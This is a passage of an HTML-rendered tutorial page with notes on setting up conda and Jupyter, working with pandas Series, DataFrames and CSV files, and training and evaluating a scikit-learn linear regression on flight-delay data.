class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> conda install pandas</span><br><br>Install jupyter<br><span class="hljs-meta">#</span><span class="bash"> conda install jupyter</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> conda list</span>Â <br>will return a list of installed libraries<br></code></pre></td></tr></table></figure><p><strong>Launch notebook from the active environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. Activate your environment<br><span class="hljs-meta">#</span><span class="bash"> conda activate my_notebook_env</span><br>3. Launch Jupyter notebooks<br><span class="hljs-meta">#</span><span class="bash"> jupyter notebook</span><br><br>NOTES:Â <br>&lt;CTRL&gt;+&lt;C&gt; &lt;CTRL&gt;+&lt;C&gt; will shut down the kernel and bring back the command prompt<br>You may need to deactivate and reactivate your environment before you launch Jupyter notebooks the first time after you install a new package<br></code></pre></td></tr></table></figure><h3 id="3ã€Pandas"><a href="#3ã€Pandas" class="headerlink" title="3ã€Pandas"></a>3ã€Pandas</h3><p><strong>What is pandas?</strong></p><ul><li><p>Open source/BSD-licensed library </p></li><li><p>High performance and familiar data structures and data analysis tools</p></li><li><p><a href="https://pandas/pydata.org">https://pandas/pydata.org</a></p></li></ul><p><strong>pandas Series is similar to Python list</strong></p><ul><li><p>One dimensional array of objects</p></li><li><p>Each row as an index</p></li><li><p>By default index is zero-based</p></li></ul><div class="table-container"><table><thead><tr><th>index</th><th>value</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td></tr><tr><td>1</td><td>Dulles</td></tr><tr><td>2</td><td>London Heathrow</td></tr><tr><td>3</td><td>Schiphol</td></tr></tbody></table></div><p><strong>Create a new Series</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>airports = pd.Series([<br>Â  Â  Â  Â  Â Â    <span class="hljs-string">&#x27;Seattle-Tacoma&#x27;</span>,<br>Â  Â  Â  Â  Â Â    <span class="hljs-string">&#x27;Dulles&#x27;</span>,<br>Â  Â  Â  Â  Â  Â   <span class="hljs-string">&#x27;London Heathrow&#x27;</span>,<br>Â  Â  Â  Â  Â Â    <span class="hljs-string">&#x27;Schiphol&#x27;</span><br>Â Â  Â  Â  Â  Â  ])<br></code></pre></td></tr></table></figure><p><strong>Access similar to a list</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># London Heathrow</span><br>airports[<span class="hljs-number">2</span>]<br><br><span class="hljs-comment"># Use a loop to iterate through all the values</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> airports:<br>    <span class="hljs-built_in">print</span>(value) <br></code></pre></td></tr></table></figure><p><strong>DataFrame for two dimensional data structures</strong></p><p>Similar to a table in a database or spreadsheet</p><ul><li><p>Coumns identified by name</p></li><li><p>Rows of data</p></li><li><p>Index column</p></li></ul><div class="table-container"><table><thead><tr><th>index</th><th>Name</th><th>City</th><th>Country</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><p><strong>Create a DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">airports = pd.DataFrame([<br>Â Â  [<span class="hljs-string">&#x27;Seattle-Tacoma&#x27;</span>,Â <span class="hljs-string">&#x27;Seattle&#x27;</span>,Â <span class="hljs-string">&#x27;USA&#x27;</span> ],<br>Â Â  [<span class="hljs-string">&#x27;Dulles&#x27;</span>,Â <span class="hljs-string">&#x27;Washington&#x27;</span>,Â <span class="hljs-string">&#x27;USA&#x27;</span>],<br>Â Â  [<span class="hljs-string">&#x27;London Heathrow&#x27;</span>,Â <span class="hljs-string">&#x27;London&#x27;</span>,Â <span class="hljs-string">&#x27;United Kingdom&#x27;</span>],<br>Â Â  [<span class="hljs-string">&#x27;Schiphol&#x27;</span>,Â <span class="hljs-string">&#x27;Amsterdam&#x27;</span>,Â <span class="hljs-string">&#x27;Netherlands&#x27;</span>]<br>Â ])<br></code></pre></td></tr></table></figure><p><strong>airports:</strong></p><div class="table-container"><table><thead><tr><th>index</th><th>0</th><th>1</th><th>2</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><p><strong>columns parameter to specify column names</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">airports = pd.DataFrame([<br>Â Â  [<span class="hljs-string">&#x27;Seattle-Tacoma&#x27;</span>,Â <span class="hljs-string">&#x27;Seattle&#x27;</span>,Â <span class="hljs-string">&#x27;USA&#x27;</span> ],<br>Â Â  [<span class="hljs-string">&#x27;Dulles&#x27;</span>,Â <span class="hljs-string">&#x27;Washington&#x27;</span>,Â <span class="hljs-string">&#x27;USA&#x27;</span>],<br>Â Â  [<span class="hljs-string">&#x27;London Heathrow&#x27;</span>,Â <span class="hljs-string">&#x27;London&#x27;</span>,Â <span class="hljs-string">&#x27;United Kingdom&#x27;</span>],<br>Â Â  [<span class="hljs-string">&#x27;Schiphol&#x27;</span>,Â <span class="hljs-string">&#x27;Amsterdam&#x27;</span>,Â <span class="hljs-string">&#x27;Netherlands&#x27;</span>]],<br>Â Â  columns= [<span class="hljs-string">&#x27;Name&#x27;</span>,<span class="hljs-string">&#x27;City&#x27;</span>,<span class="hljs-string">&#x27;Country&#x27;</span>]<br>Â  Â )<br></code></pre></td></tr></table></figure><p><strong>airports:</strong></p><div class="table-container"><table><thead><tr><th>index</th><th>Name</th><th>City</th><th>Country</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><h3 id="4ã€Pandas-DataFrame"><a href="#4ã€Pandas-DataFrame" class="headerlink" title="4ã€Pandas DataFrame"></a>4ã€Pandas DataFrame</h3><p><strong>airports:</strong></p><div class="table-container"><table><thead><tr><th>index</th><th>Name</th><th>City</th><th>Country</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><h4 id="1ï¼‰Examining-pandas-DataFrame-contents"><a href="#1ï¼‰Examining-pandas-DataFrame-contents" class="headerlink" title="1ï¼‰Examining pandas DataFrame contents"></a>1ï¼‰Examining pandas DataFrame contents</h4><p><strong>head</strong> - first <em>n</em> rows</p><p><strong>tail</strong> - last <em>n</em> rows</p><p><strong>shape</strong> - number of rows and columns</p><p><strong>info</strong> - return more detailed information</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">airports.head(<span class="hljs-number">3</span>)<br><br>airports.tail(<span class="hljs-number">3</span>)<br><br>airports.shape<br><br>airports.info()<br></code></pre></td></tr></table></figure><h4 id="2ï¼‰Query-a-DataFrame"><a href="#2ï¼‰Query-a-DataFrame" class="headerlink" title="2ï¼‰Query a DataFrame"></a>2ï¼‰Query a DataFrame</h4><p><strong>Return specific rows or columns </strong></p><p>AKA slicing and dicing</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Request a single column</span><br>airports[<span class="hljs-string">&#x27;City&#x27;</span>]<br><br><span class="hljs-comment"># Request a list of columns</span><br>airports[[<span class="hljs-string">&#x27;Name&#x27;</span>,Â <span class="hljs-string">&#x27;Country&#x27;</span>]]<br><br><span class="hljs-comment"># iloc returns specific rows and columns by position</span><br><span class="hljs-comment"># Use the syntax iloc[rows, columns]  </span><br>airports.iloc[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br><span class="hljs-comment"># will return: Seattle-Tacoma</span><br>airports.iloc[<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]<br><span class="hljs-comment"># will return: United Kingdom</span><br><br><span class="hljs-comment"># The range : returns all rows or columns</span><br>airports.iloc[:,:]<br><br><span class="hljs-comment"># You can request a range of rows or columns</span><br>airports.iloc[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>,:]<br><span class="hljs-comment"># returns first 2 rows and all columns</span><br>airports.iloc[:,<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br><span class="hljs-comment"># returns all rows and the first two columns</span><br><br><span class="hljs-comment"># Request a list of rows or columns</span><br>airports.iloc[:,[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>]]<br><span class="hljs-comment"># will return all rows and column 0 and column 2 (Name and Country)</span><br><br><span class="hljs-comment"># loc to specify items by name</span><br>airports.loc[:,[<span class="hljs-string">&#x27;Name&#x27;</span>,<span class="hljs-string">&#x27;Country&#x27;</span>]]<br><span class="hljs-comment"># will return all rows and the columns Name and Country</span><br></code></pre></td></tr></table></figure><h4 id="3ï¼‰Removing-and-splitting-DataFrame-columns"><a href="#3ï¼‰Removing-and-splitting-DataFrame-columns" class="headerlink" title="3ï¼‰Removing and splitting DataFrame columns"></a>3ï¼‰Removing and splitting DataFrame columns</h4><ul><li><p>When preparing data for machine learning you may need to remove specific columns from the DataFrame</p></li><li><p>When preparing data for machine learning you may need to split the columns into separate DataFrames</p><ul><li>You might need to split quantitative and qualitative data into separate DataFrames</li></ul></li></ul><p><strong><code>drop</code> deletes columns from a DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Use drop to delete columns from a DataFrame</span><br><span class="hljs-comment"># DataFrameName.drop(columns=[&#x27;columnname&#x27;])</span><br>new_df = delays_df.drop(columns=[<span class="hljs-string">&#x27;Actual_arr_time&#x27;</span>])Â <br><br><span class="hljs-comment"># Use inplace to edit the existing DataFrame</span><br><span class="hljs-comment"># will remove Actual_arr_time from the DataFrame delays_df</span><br>delays_df.drop(columns=[<span class="hljs-string">&#x27;Actual_arr_time&#x27;</span>], inplace=<span class="hljs-literal">True</span>)Â <br></code></pre></td></tr></table></figure><p><strong>Create a slice of the DataFrame and assign it to a new DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># will create a new DataFrame containing the specified slice</span><br>desc_df = delays_df.loc[:,[<span class="hljs-string">&#x27;Origin_airport&#x27;</span>,<span class="hljs-string">&#x27;Dest_airport&#x27;</span>]] <br></code></pre></td></tr></table></figure><h4 id="4ï¼‰Handling-duplicates-and-rows-with-missing-values"><a href="#4ï¼‰Handling-duplicates-and-rows-with-missing-values" class="headerlink" title="4ï¼‰Handling duplicates and rows with missing values"></a>4ï¼‰Handling duplicates and rows with missing values</h4><ul><li><p>Many models and procedures in data science will return an error if they analyze records with missing values</p></li><li><p>When you merge data from multiple sources you may get duplicate rows</p></li></ul><p><strong>Remove rows missing values</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Use info to check for missing values</span><br>delays_df.info()<br><br><span class="hljs-comment"># Use dropna to remove rows missing values</span><br><span class="hljs-comment"># Will create a new DataFrame without rows containing missing values</span><br>delay_no_nulls_df = delays_df.dropna()<br><br><span class="hljs-comment"># Specify inplace=True to update the existing DataFrame</span><br><span class="hljs-comment"># Will remove rows with missing values from the existing DataFrame</span><br>delays_df.dropna(inplace=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>Drop the duplicate rows</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># will return True if a row is a duplicate of a previous row</span><br>airports_df.duplicated()<br><br><span class="hljs-comment"># will drop the duplicate rows</span><br>airports_df.drop_duplicates(inplace=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="5ã€CSV"><a href="#5ã€CSV" class="headerlink" title="5ã€CSV"></a>5ã€CSV</h3><p><strong>Comma separated variable (CSV) files are a popular format for data files</strong></p><ul><li><p>Each row of the file contains one record</p></li><li><p>A special character such as a comma is used to separate column values</p></li><li><p>The first row may contain the names of the columns</p></li></ul><p><strong>Example: </strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Name,</span>City,Country<br>Seattle-Tacoma,Seattle,USA<br><span class="hljs-built_in">Dulles,</span>Washington,USA<br><span class="hljs-built_in">Heathrow,</span>London,United Kingdom<br><span class="hljs-built_in">Schiphol,</span>Amsterdam,Netherlands<br><span class="hljs-built_in">Changi,</span>Singapore,Singapore<br><span class="hljs-built_in">Pearson,</span>Toronto,Canada<br><span class="hljs-built_in">Narita,</span>Tokyo,Japan<br></code></pre></td></tr></table></figure><h4 id="1ï¼‰Jupyter-notebooks"><a href="#1ï¼‰Jupyter-notebooks" class="headerlink" title="1ï¼‰Jupyter notebooks"></a>1ï¼‰Jupyter notebooks</h4><p><strong>How does your notebook find the file?</strong></p><ul><li><p>You need to upload the files to Jupyter</p></li><li><p>It is common practice to create a subfolder to hold your data files</p></li><li><p>Create a folder for your data files by selecting <strong>New</strong> | <strong>Folder</strong> </p></li></ul><p><strong>Upload the file to access it from notebooks</strong></p><p>Navigate to the folder and upload the files you want to access from your notebooks by selecting <strong>Upload</strong></p><h4 id="2ï¼‰Read-and-write-CSV-files-from-pandas-DataFrames"><a href="#2ï¼‰Read-and-write-CSV-files-from-pandas-DataFrames" class="headerlink" title="2ï¼‰Read and write CSV files from pandas DataFrames"></a>2ï¼‰Read and write CSV files from pandas DataFrames</h4><p><strong>Read_csv loads a DataFrame from a CSV</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># read_csv loads a DataFrame from a CSV</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airports.csv&#x27;</span>)<br><br><span class="hljs-comment"># Rows with an extra, or other issues cause an error and the file does not load</span><br><span class="hljs-comment"># Specify error_bad_lines=False to skip rows with errors</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsInvalidRows.csv&#x27;</span>,Â error_bad_lines=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># If the first row does not contain column headers specify header=None</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsNoHeaderRows.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># Provide names for the columns with the names parameter</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsNoHeaderRows.csv&#x27;</span>, header=<span class="hljs-literal">None</span>, names=[<span class="hljs-string">&#x27;Name&#x27;</span>,<span class="hljs-string">&#x27;City&#x27;</span>,<span class="hljs-string">&#x27;Country&#x27;</span>])<br><br><span class="hljs-comment"># Missing valuesÂ appear as NaN</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsBlankValues.csv&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Use to_csv to write the contents of a DataFrame to a CSV file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Use to_csv to write the contents of a DataFrame to a CSV file</span><br>airports_df.to_csv(<span class="hljs-string">&#x27;Data/MyNewCSVFile.csv&#x27;</span>)<br><br><span class="hljs-comment"># Specify index=False if you do not want to include the index column</span><br>airports_df.to_csv(<span class="hljs-string">&#x27;Data/MyNewCSVFile.csv&#x27;</span>, index=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h3 id="6ã€Scikit-learn"><a href="#6ã€Scikit-learn" class="headerlink" title="6ã€Scikit-learn"></a>6ã€Scikit-learn</h3><p>Open source library for preprocessing data and model training</p><h4 id="1ï¼‰Splitting-test-and-training-data-with-scikit-learn"><a href="#1ï¼‰Splitting-test-and-training-data-with-scikit-learn" class="headerlink" title="1ï¼‰Splitting test and training data with scikit-learn"></a>1ï¼‰Splitting test and training data with scikit-learn</h4><p><strong>Machine learning 101</strong></p><p>Given X data, predict y value</p><ul><li><p>Given a customer, predict if they will by a product</p></li><li><p>Given a shopping cart, predict similar products</p></li><li><p>Given a flight, predict the chance it will be late</p></li></ul><p><strong>We need to split our data before creating a model</strong></p><p>Conventions: </p><ul><li><p>Put the data you want to predict (the label) in a DataFrame called y</p></li><li><p>Put the data that influence the label (the features) in a DataFrame called X</p></li></ul><p><strong>You may need to split your data into training and test data sets before you train your model</strong></p><ul><li><p><strong>train</strong> will be used to train the model</p></li><li><p><strong>test</strong> will be used to test the model </p></li><li><p>Typically put aside 20 to 30% of your records for testing</p></li></ul><pre><code class=" mermaid">graph LRA[DataFrame] --&gt; B[DataFrame X] --&gt; D[X_train]B[DataFrame X] --&gt; E[X_test]A --&gt; C[DataFrame y] --&gt; F[y_train]C[DataFrame y] --&gt; G[y_train]</code></pre><p><strong>Use <code>train_test_split</code> to split each of the X and y DataFrames into training and test DataFrames</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">y = delays_df.loc[:,[<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>]]<br>X = delays_df.loc[:,[<span class="hljs-string">&#x27;DISTANCE&#x27;</span>,Â <span class="hljs-string">&#x27;CRS_ELAPSED_TIME&#x27;</span>]]<br><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.3</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># X_train, X_test, y_train, y_test â€“ names of DataFrames to create to store the training and test data</span><br><span class="hljs-comment"># X â€“ name of the DataFrame containing your features</span><br><span class="hljs-comment"># y â€“ name of the DataFrame containing your labels</span><br><span class="hljs-comment"># test_size â€“ what portion of the rows to put into the test data frames</span><br><span class="hljs-comment"># random_state â€“ sets the seed for random numbers - every time the code runs the same &quot;random&quot; sets of rows will be returned</span><br><br></code></pre></td></tr></table></figure><p><strong>DataFrame:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>0</td><td>1670</td><td>225</td><td>7</td></tr><tr><td>1</td><td>580</td><td>105</td><td>-4</td></tr><tr><td>2</td><td>425</td><td>96</td><td>5</td></tr><tr><td>â€¦</td><td>â€¦</td><td>â€¦</td><td>â€¦</td></tr><tr><td>299645</td><td>1500</td><td>210</td><td>73</td></tr></tbody></table></div><p><strong>DataFrame X:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th></tr></thead><tbody><tr><td>0</td><td>1670</td><td>225</td></tr><tr><td>1</td><td>580</td><td>105</td></tr><tr><td>â€¦</td><td>â€¦</td><td>â€¦</td></tr><tr><td>299645</td><td>1500</td><td>210</td></tr></tbody></table></div><p><strong>DataFrame y:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>0</td><td>7</td></tr><tr><td>1</td><td>-4</td></tr><tr><td>â€¦</td><td>â€¦</td></tr><tr><td>299645</td><td>74</td></tr></tbody></table></div><p><strong>X_train:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th></tr></thead><tbody><tr><td>0</td><td>1670</td><td>225</td></tr><tr><td>1</td><td>580</td><td>105</td></tr><tr><td>â€¦</td><td>â€¦</td><td>â€¦</td></tr><tr><td>299645</td><td>1500</td><td>210</td></tr></tbody></table></div><p><strong>X_test:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th></tr></thead><tbody><tr><td>2</td><td>425</td><td>96</td></tr><tr><td>17</td><td>750</td><td>130</td></tr><tr><td>â€¦</td><td>â€¦</td><td>â€¦</td></tr><tr><td>299643</td><td>425</td><td>100</td></tr></tbody></table></div><p><strong>y_train:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>0</td><td>7</td></tr><tr><td>1</td><td>-4</td></tr><tr><td>â€¦</td><td>â€¦</td></tr><tr><td>299645</td><td>74</td></tr></tbody></table></div><p><strong>y_test:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>2</td><td>5</td></tr><tr><td>17</td><td>-1</td></tr><tr><td>â€¦</td><td>â€¦</td></tr><tr><td>299645</td><td>11</td></tr></tbody></table></div><h4 id="2ï¼‰Train-a-linear-regression-model-with-scikit-learn"><a href="#2ï¼‰Train-a-linear-regression-model-with-scikit-learn" class="headerlink" title="2ï¼‰Train a linear regression model with scikit-learn"></a>2ï¼‰Train a linear regression model with scikit-learn</h4><p><strong>Once your data is prepared you can use it to train a model</strong></p><p><strong>There are different libraries and classes you can use to train a model</strong></p><ul><li><p>The <strong>scikit-learn</strong> library contains a number of different classes to train different types of models</p></li><li><p>The <strong>LinearRegression</strong> class fits a linear model</p></li><li><p>Call the <strong>fit</strong> method to fit your data to a linear model which can be used to predict the outcomes for new data</p></li></ul><p><strong>The code to train a model usually follows the same pattern</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import the desired class from the library</span><br><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LinearRegression<br><br><span class="hljs-comment"># Create an instance of the class</span><br>regressor = LinearRegression()<br><br><span class="hljs-comment"># use the fit method to train the model using your training data</span><br>regressor.fit(X_train, y_train)<br></code></pre></td></tr></table></figure><h4 id="3ï¼‰Testing-a-model"><a href="#3ï¼‰Testing-a-model" class="headerlink" title="3ï¼‰Testing a model"></a>3ï¼‰Testing a model</h4><p>Predict values for the test data in X_test</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># predict returns the values the trained model predicts for new data</span><br>y_pred = regressor.predict(X_test)<br></code></pre></td></tr></table></figure><p>Compare the predicted values to the actual values in y_test to see how well your model performs</p><h4 id="4ï¼‰Evaluating-accuracy-of-a-model-using-calculations"><a href="#4ï¼‰Evaluating-accuracy-of-a-model-using-calculations" class="headerlink" title="4ï¼‰Evaluating accuracy of a model using calculations"></a>4ï¼‰Evaluating accuracy of a model using calculations</h4><p><strong>Itâ€™s impractical to visually compare predicted and actual values across thousands of rows</strong> </p><p>Instead we use standard calculations to get a sense of overall accuracy</p><p><strong>Mean Squared Error (MSE) is the average error</strong></p><ul><li><p>MSE = mean((actual â€“ predicted)**2)</p></li><li><p>You could write a python function to loop through each row, and perform this calculation</p></li><li><p>OR You could use <strong>mean_squared_error</strong> from the <strong>scikit-learn</strong> library</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> metrics<br><br>metrics.mean_squared_error(y_test, y_pred)<br></code></pre></td></tr></table></figure><p><strong>Root Mean Squared Error (RMSE) is the square root of the mean squared error</strong></p><ul><li><p>RMSE = âˆšMSE</p></li><li><p><strong>scikit-learn</strong> doesnâ€™t have a method for RMSE but</p><ul><li><p><strong>scikit-learn</strong> has the mean_squared_error method to calculate MSE</p></li><li><p><strong>numpy</strong> has a sqrt method to calculate square root </p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> metrics<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>np.sqrt(metrics.mean_squared_error(y_test, y_pred))<br></code></pre></td></tr></table></figure><p><strong>Different models have different metrics to measure accuracy</strong></p><ul><li><p><strong>numpy</strong> provides standard mathematical functions </p></li><li><p><strong>scikit-learn</strong> provides a number of functions for assessing prediction error</p></li><li><p>Together they allow us to measure model accuracy</p></li></ul><h3 id="7ã€numpy-vs-pandas"><a href="#7ã€numpy-vs-pandas" class="headerlink" title="7ã€numpy vs pandas"></a>7ã€numpy vs pandas</h3><p><strong>Letâ€™s take a closer look at our predictions</strong></p><p>When we predicted values using our trained model the results were returned into an object called y_pred</p><p><code>y_pred = regressor.predict(X_test)</code></p><p>We compared the values in y_test to y_pred to see how accurately our model predicted arrival delays</p><p><strong>Keep an eye on the datatypes</strong></p><p><strong>y_pred</strong> is not a <strong>pandas DataFrame</strong>. It is a <strong>numpy array</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># You can use type() to check the type of any python object</span><br><span class="hljs-built_in">type</span>(y_pred)<br><span class="hljs-comment"># returns numpy.ndarray</span><br><br><span class="hljs-built_in">type</span>(y_test)<br><span 